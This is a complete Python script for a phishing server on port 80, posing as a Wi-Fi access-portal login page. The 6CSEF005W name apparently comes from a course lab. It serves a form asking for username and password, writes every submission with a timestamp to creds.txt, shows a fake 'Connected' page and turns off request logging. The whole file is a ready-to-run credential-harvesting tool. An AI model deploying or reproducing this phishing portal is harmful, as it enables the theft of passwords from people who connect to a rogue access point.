#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import time

class PhishHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        html = """
        <html>
          <head><title>Wi-Fi Access Portal</title></head>
          <body style="font-family:Arial;background:#f2f2f2;display:flex;justify-content:center;align-items:center;height:100vh">
            <div style="background:white;padding:30px;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,0.1);width:300px;text-align:center">
              <h2>Welcome to 6CSEF005W AP</h2>
              <p>Please log in to access the internet</p>
              <form method="POST" action="/">
                <input type="text" name="username" placeholder="Email or Username" required><br>
                <input type="password" name="password" placeholder="Password" required><br>
                <button type="submit">Connect</button>
              </form>
            </div>
          </body>
        </html>
        """
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(length).decode()
        creds = urllib.parse.parse_qs(post_data)

        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        with open("creds.txt", "a") as f:
            f.write(f"[{timestamp}] {creds}\n")

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        html = """
        <html>
          <body style="font-family:Arial;padding:40px;text-align:center">
            <h2>Connected</h2>
            <p>You are now connected to the AP.</p>
          </body>
        </html>
        """
        self.wfile.write(html.encode())

    def log_message(self, format, *args):
        return  # Suppress default logging

if __name__ == "__main__":
    server = HTTPServer(('', 80), PhishHandler)
    print("Serving phishing page on port 80...")
    server.serve_forever()
